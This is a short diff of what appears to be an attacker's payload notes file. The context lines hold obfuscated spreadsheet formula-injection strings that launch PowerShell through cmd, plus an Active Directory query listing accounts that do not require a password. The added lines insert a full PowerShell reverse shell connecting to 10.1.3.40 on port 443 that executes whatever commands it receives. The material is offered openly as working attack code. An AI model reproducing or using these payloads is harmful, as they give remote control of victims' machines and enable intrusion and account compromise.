@@ -5,3 +5,5 @@ REM:let me mad:&@p^o^w^e^r^shell ^C^':'\\\\'/'\'*/'\'*'^2^/'\/////'^c^'*'^c^.?'^
 =cmd|'/c REM.&&@p^o^w^e^r^s^h^e^l^l c:/*/*2/?al?.?x?"'!_xlbgnm.A1
 
 'Get-ADUser -Filter 'useraccountcontrol -band 32' -Properties useraccountcontrol | FT Name'
+
+-nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.1.3.40',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
